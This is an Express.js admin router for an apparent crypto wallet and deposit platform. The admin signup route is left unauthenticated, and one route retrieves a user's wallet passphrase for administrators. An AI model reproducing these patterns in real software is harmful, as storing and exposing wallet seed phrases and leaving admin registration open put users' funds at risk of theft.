const express = require('express');
const router = express.Router();
const adminRouting= require('../services/admin.service');
const authenticateAdmin = require('../middleware/adminAuth.middleware');
const { upload }= require('../utils/s3'); 
// Assume you have middleware for admin auth


// Admin Signup
router.post('/signup', adminRouting.signup);

// Admin Login
router.post('/login', adminRouting.login);

// Get all users
router.get('/users', authenticateAdmin, adminRouting.getAllUsers);

// Get user count
router.get('/users/count', authenticateAdmin, adminRouting.getUserCount);

// Route for approving wallet connection
router.post('/approve-wallet/:userId', authenticateAdmin, adminRouting.approveWallet);

//Pending deposits
router.get('/deposits/pending', authenticateAdmin, adminRouting.pendingDeposits);

//approve deposits
router.post('/approve-deposit/:userId', authenticateAdmin, adminRouting.approveDeposits);
router.post('/update-profile', authenticateAdmin, upload.single('image'), adminRouting.updateAdminProfile);
router.get('/wallet-details/:userId', authenticateAdmin, adminRouting.getUserPassPhrase);
router.get('/wallet-details/', authenticateAdmin, adminRouting.getAllUsersWithWalletDetails);
router.get('/get-admin', authenticateAdmin, adminRouting.getAdmin);

module.exports = router;
